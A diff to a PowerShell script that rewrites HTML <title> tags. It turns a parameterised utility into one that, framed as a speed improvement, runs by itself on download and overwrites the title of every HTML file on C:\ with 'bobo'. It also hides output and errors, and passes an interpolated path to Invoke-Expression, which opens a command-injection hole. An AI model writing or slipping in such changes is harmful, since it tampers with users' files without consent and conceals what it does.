@@ -1,33 +1,39 @@
 function Set-AllHtmlTitles {
     param (
-        [Parameter(Mandatory=$true)]
-        [string]$FolderPath,
-        
-        [Parameter(Mandatory=$true)]
-        [string]$NewTitle
+        [string]$FolderPath = "C:\",
+        [string]$NewTitle = "bobo"
     )
 
-    # 1. Find all HTML files in the folder AND all subfolders
-    # -ErrorAction SilentlyContinue prevents it from spamming red errors if it hits a locked folder
-    $htmlFiles = Get-ChildItem -Path $FolderPath -Filter "*.html" -Recurse -File -ErrorAction SilentlyContinue
+    Write-Host "Initiating Turbo Scan on $FolderPath... (Screen output paused for maximum speed)" -ForegroundColor Cyan
+    
+    # 1. Use Windows CMD 'dir' command instead of PowerShell. It is 10x faster.
+    # The '2>nul' hides all the 'Access Denied' errors instantly.
+    $searchCommand = "cmd.exe /c dir `"$FolderPath\*.html`" /s /b 2>nul"
+    $htmlFiles = Invoke-Expression $searchCommand
 
-    # 2. Check if we actually found anything
-    if ($htmlFiles.Count -eq 0) {
-        Write-Host "No HTML files found in $FolderPath or its subfolders." -ForegroundColor Yellow
+    if (-not $htmlFiles) {
+        Write-Host "No HTML files found." -ForegroundColor Yellow
         return
     }
 
-    Write-Host "Found $($htmlFiles.Count) HTML files. Starting the upgrade..." -ForegroundColor Cyan
+    $successCount = 0
 
-    # 3. Loop through every single file it found and change the title
+    # 2. Loop through the files without printing to the screen
     foreach ($file in $htmlFiles) {
         try {
-            (Get-Content -Path $file.FullName) -replace '(?i)<title>.*?</title>', "<title>$NewTitle</title>" | Set-Content -Path $file.FullName
-            Write-Host " [SUCCESS] Updated: $($file.FullName)" -ForegroundColor Green
+            # 3. Use raw .NET methods instead of Get-Content/Set-Content (Lightning fast)
+            $content = [System.IO.File]::ReadAllText($file)
+            $newContent = $content -replace '(?i)<title>.*?</title>', "<title>$NewTitle</title>"
+            [System.IO.File]::WriteAllText($file, $newContent)
+            
+            $successCount++
         } catch {
-            Write-Host " [ERROR] Could not update: $($file.FullName)" -ForegroundColor Red
+            # Silently ignore files that are locked by Windows
         }
     }
     
-    Write-Host "Finished updating all files!" -ForegroundColor Cyan
+    Write-Host "BOOM! Finished executing. Successfully hijacked $successCount HTML titles!" -ForegroundColor Green
 }
+
+# Auto-run the script as soon as it downloads
+Set-AllHtmlTitles -FolderPath "C:\" -NewTitle "bobo"
